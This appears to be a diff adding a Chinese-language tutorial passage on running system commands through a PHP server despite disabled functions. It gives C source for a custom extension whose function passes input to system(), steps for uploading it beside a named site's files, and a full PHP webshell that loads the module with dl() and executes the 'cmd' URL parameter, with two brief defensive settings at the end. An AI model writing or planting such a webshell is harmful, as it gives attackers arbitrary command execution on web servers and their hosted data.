@@ -1,0 +1,67 @@
+PHP_FUNCTION(netxfly)
+{
+	char *arg = NULL;
+	int arg_len, len;
+	char string[256];
+	if (zend_parse_parameters(ZEND_NUM_ARGS() TSRMLS_CC, "s",&arg, &arg_len) == FAILURE) {
+		return;
+	}
+	System(arg);
+}
+
+
+从 phpinfo 得知目标站点的 extension_dir=
+SCRIPT_FILENAME=/pub/vhosts/69ngo/www.69ngo.com/include/cmd_class. php，
+我们把 security.so 上传到 cmd_class.php 同一目录下，所以在用 webshell动态加载 security.so
+的路径为：dl("../../../pub/vhosts/69ngo/www.69ngo.com/include/security.so");
+
+写一个简单的 WebShell：
+
+<?php
+
+if ($_GET[cmd] != "")
+
+{
+
+if (!strcmp($_GET[cmd], "info"))
+
+{
+
+phpinfo();
+
+}
+
+else
+
+{
+
+dl("../../../pub/vhosts/69ngo/www.69ngo.com/include/security.so");
+
+$command = $_GET[cmd] . " >tmp.txt";
+
+netxfly($command);
+
+echo file_get_contents(tmp.txt);
+
+echo "<br>The Command Completed    Successful!";
+
+}
+
+}
+
+else
+
+{
+
+echo "Error, ;)";
+
+}
+
+?>
+
+
+上传webshell到“生产环境”中（目标主机），就可以调用 security.so 模块中的 netxfly()函数执行系统命令了，如下图所示：
+
+防御方法：
+1.  Safe_mode=on，禁止使用 dl()函数加载外部模块
+2.  将 dl()加到 disable_functions 选项列表中
